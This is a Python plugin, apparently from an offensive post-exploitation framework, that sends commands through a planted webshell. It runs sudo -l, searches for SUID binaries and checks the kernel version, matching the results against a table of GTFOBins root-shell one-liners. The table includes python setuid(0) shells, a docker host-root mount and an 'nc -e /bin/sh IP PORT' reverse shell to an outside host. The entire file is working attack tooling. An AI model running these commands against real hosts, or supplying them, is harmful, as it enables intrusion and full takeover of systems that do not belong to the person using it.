"""Post-ex: privilege-escalation hunt with GTFOBins watchlist."""
import os, re

SUID_WATCHLIST = ["nmap","vim","vi","find","bash","sh","dash","more","less","nc",
                  "nc.traditional","awk","perl","python","python3","gdb","env","tee",
                  "wget","cp","mv","docker","socat","base64","openssl","php","ed"]
SUID_HINTS = {
    "nmap": "nmap --interactive (then: !sh)", "vim": "vim -c ':!sh'", "vi": "vim -c ':!sh'",
    "find": "find . -exec /bin/sh -i \\;", "bash": "bash -p",
    "more": "'!sh' inside more", "less": "'!sh' inside less",
    "python": "python -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'",
    "python3": "python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'",
    "awk": "awk 'BEGIN{system(\"/bin/sh\")}'", "nc": "nc -e /bin/sh IP PORT",
    "nc.traditional": "nc -e /bin/sh IP PORT", "env": "env /bin/sh -p",
    "docker": "docker run -v /:/mnt --rm -it alpine sh",
}

@register_plugin("Privesc hunt", phase="postex", priority=2, attck="TA0004",
                 desc="sudo -l + SUID scan vs GTFOBins hints")
def postex_privesc(akazza, shell_url, param):
    GREEN, YELLOW, RED, RESET = col["GREEN"], col["YELLOW"], col["RED"], col["RESET"]
    findings = []
    out = akazza.webshell_cmd(shell_url, param, "sudo -l 2>&1")
    print(f"\n{YELLOW}[sudo -l]{RESET}\n{out.strip()[:600]}")
    if "NOPASSWD" in out:
        findings.append(("NOPASSWD sudo rule", "allowed binary → GTFOBins"))

    out = akazza.webshell_cmd(shell_url, param,
                             "find / -perm -4000 -type f 2>/dev/null", timeout=60)
    print(f"\n{YELLOW}[SUID binaries]{RESET} found: {len([l for l in out.splitlines() if l.strip().startswith('/')])}")
    for line in out.splitlines():
        path = line.strip()
        if path.startswith("/") and os.path.basename(path) in SUID_WATCHLIST:
            b = os.path.basename(path)
            print(f"    {GREEN}[★] SUID HIT: {path}{RESET}")
            findings.append((f"SUID {path}", SUID_HINTS.get(b, "GTFOBins")))

    out = akazza.webshell_cmd(shell_url, param, "uname -r")
    m = re.search(r"(\d+)\.(\d+)", out)
    if m and (int(m.group(1)), int(m.group(2))) < (4, 0):
        findings.append(("Old kernel", f"{out.strip()} — searchsploit (Dirty COW etc.)"))

    print(f"\n{GREEN}{'═'*50}{RESET}")
    if findings:
        print(f"{BOLD}{GREEN}PRIVESC FINDINGS ({len(findings)}):{RESET}")
        for t, h in findings:
            print(f"  {GREEN}[★]{RESET} {t} — {h}")
        akazza.session_log["postex_findings"].extend(f"{t}: {h}" for t, h in findings)
    else:
        print(f"{YELLOW}nothing obvious — run linPEAS manually{RESET}")
